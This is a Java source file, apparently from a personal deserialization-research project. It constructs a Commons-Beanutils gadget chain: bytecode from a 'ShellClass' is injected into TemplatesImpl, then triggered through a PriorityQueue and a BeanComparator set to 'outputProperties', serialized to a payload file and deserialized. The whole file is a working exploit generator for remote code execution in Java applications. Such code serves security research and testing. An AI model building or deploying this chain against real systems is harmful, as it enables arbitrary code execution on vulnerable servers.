package Seri.CBGadgets;

import Seri.Utils;
import com.mchange.v2.codegen.bean.BeangenUtils;
import com.mchange.v2.codegen.intfc.DelegatorGenerator;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.NullComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import org.springframework.util.comparator.CompoundComparator;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Comparator;
import java.util.PriorityQueue;

import static Seri.Utils.setValue;

public class CBCaseInsensitiveOrder {
    public static void main(String[] args) throws Exception {
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates,"_name","aaa");
        setValue(templates,"_bytecodes",new byte[][]{bytes});
        setValue(templates,"_tfactory",new TransformerFactoryImpl());

//        BeanComparator beanComparator = new BeanComparator("class" , new NullComparator());
        BeanComparator beanComparator = new BeanComparator("class" ,new ObjectToStringComparator());
        PriorityQueue<Object> priorityQueue = new PriorityQueue(2 ,beanComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        Utils.setValue(beanComparator ,"property" ,"outputProperties");
        Utils.serialize(priorityQueue ,"bin/CBCaseInsensitiveOrder.bin");
        Utils.unserialize("bin/CBCaseInsensitiveOrder.bin");

    }
}
